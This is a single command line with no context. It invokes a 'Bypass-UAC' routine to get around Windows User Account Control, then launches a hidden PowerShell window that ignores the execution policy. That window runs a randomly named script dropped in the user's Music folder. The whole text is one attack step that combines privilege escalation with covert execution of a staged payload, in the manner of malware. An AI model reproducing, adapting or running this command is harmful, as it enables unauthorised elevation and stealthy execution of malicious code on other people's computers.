Bypass-UAC -command "cmd.exe /k powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass c:/users/%username%/music/9usd7yge.ps1"
